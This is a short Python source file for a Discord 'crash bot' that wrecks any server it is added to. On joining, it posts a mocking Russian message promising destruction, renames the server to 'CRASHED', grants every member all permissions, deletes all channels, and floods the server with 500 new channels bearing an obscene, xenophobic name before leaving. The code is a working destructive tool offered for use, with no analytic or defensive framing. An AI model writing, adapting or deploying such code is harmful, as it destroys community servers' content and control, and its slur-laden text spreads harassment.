import discord
from discord.ext import commands
from discord import Permissions
import time
import os
token = os.environ.get('TOKENZ')

class MyClient(discord.Client):
    async def on_guild_join(self, guild):
        a = 0
        c = 0
        for i in guild.text_channels:
            if a == 0:
                await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец. Удачи :D')
                a = 1
        await guild.edit(name='__...-<<CRASHED>>-...__')
        await guild.default_role.edit(permissions=Permissions.all())

        for i in guild.channels:
            await i.delete()
            print('Канал', i, 'удалён!')

        while c < 500:
            await guild.create_text_channel(name='сосите хуй пиндосы🌈')
            c += 1
        await guild.leave()



client = MyClient()
client.run(str(token))
